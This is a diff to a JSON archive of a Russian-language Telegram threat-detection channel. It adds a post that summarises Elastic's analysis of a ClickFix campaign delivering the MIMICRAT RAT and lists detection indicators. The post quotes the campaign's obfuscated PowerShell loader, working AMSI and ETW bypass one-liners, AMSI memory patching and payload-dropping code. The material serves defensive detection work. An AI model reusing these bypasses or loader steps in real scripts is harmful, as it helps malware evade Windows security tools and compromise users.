@@ -1,8 +1,15 @@
 {
   "channel": "detectioneasy",
-  "last_update": "2026-02-26T05:22:37.017710+00:00",
-  "messages_count": 60,
+  "last_update": "2026-02-26T09:57:56.592768+00:00",
+  "messages_count": 61,
   "messages": [
+    {
+      "id": "323",
+      "title": "Elastic Security Labs разобрали кампанию ClickFix, которая заканчивается установкой кастомного RAT MIMICRAT",
+      "text": "Всем привет 💻✌️\nElastic Security Labs разобрали кампанию ClickFix, которая заканчивается установкой кастомного RAT MIMICRAT\nПо цепочке видно высокий уровень OPSEC: компрометация легитимных сайтов как инфраструктуры доставки, многоступенчатый PowerShell, затем bypass ETW + AMSI, после чего дропается Lua-лоадер, исполняющий шеллкод в памяти\n👨‍💻 Как это работает?\n🔤 доставка осуществляется через ClickFix, в результате которого выполняется обфусцированный Stage 1 — PowerShell-скрипт\npowershell.exe -WInDo Min $RdLU='aZmEwGEtHPckKyBXPxMRi.neTwOrkicsGf';$OnRa=($RdLU.Substring(17,12));$jOFn=.($RdLU[(87)/(3)]+$RdLU[19]+$RdLU[2]) $OnRa;$TNNt=$jOFn; .($TNNt.Remove(0,3).Remove(3))($TNNt);\n🔤 Stage 2 - загруженный скрипт обфусцирован арифметическими операциями\n$smaau = (-join[char[]](((7454404997-7439813680)/175799),(91873122/759282),...))\n🔤 ETW Bypass путем изменения .NET класса\n[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)\n🔤 AMSI Bypass\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n🔤 AMSI - Memory Patching. После отключения обнаружения в %ProgramData%/knz_{random} дропнут архив с Lua loader\n$ScanContent_func = [Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetMethods(\"NonPublic,Static\") | Where-Object Name -eq \"ScanContent\"\n$tttttttttt       = [zsZRXVIIMQvZ].GetMethods() | Where-Object Name -eq \"FHVcGSwOEM\"\n[System.Runtime.InteropServices.Marshal]::Copy( @([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$tttttttttt.MethodHandle.Value + [long]8)),\n0,\n[long]$ScanContent_func.MethodHandle.Value + [long]8,\n1\n)\n🔤 доставка Lua loader\n$extractTo = Join-Path $env:ProgramData (\"knz_{0}\" -f ([IO.Path]::GetRandomFileName()))\n[IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $extractTo)\nStart-Process (Join-Path $extractTo 'zbuild.exe')\n🔭 Обнаружение:\n🔤 запуск PowerShell в минимальном режиме powershell.exe -WInDo Min\n🔤 отслеживание длинных символьных последовательностей в логах PowerShell\n🔤 в логах PowerShell Reflection.Assembly, System.Diagnostics.Eventing.EventProvider, PSEtwLogProvider, System.Management.Automation.AmsiUtils, GetRandomFileName, IO.Compression.ZipFile, -join [char[]]\n🔤 создание файлов exe,zip в %ProgramData%\np.s. детекты от elastic:\nExecution via Obfuscated PowerShell Script\nDNS Query to Suspicious Top Level Domain\nSuspicious Command Shell Execution via Windows Run\nToken theft and impersonation\nPotential Privilege Escalation via Token Impersonation\nShellcode Execution from Low Reputation Module\n#detection@detectioneasy\n#ttp@detectioneasy",
+      "link": "https://t.me/detectioneasy/323",
+      "pub_date": "2026-02-26T06:34:44+00:00"
+    },
     {
       "id": "322",
       "title": "Message 322",
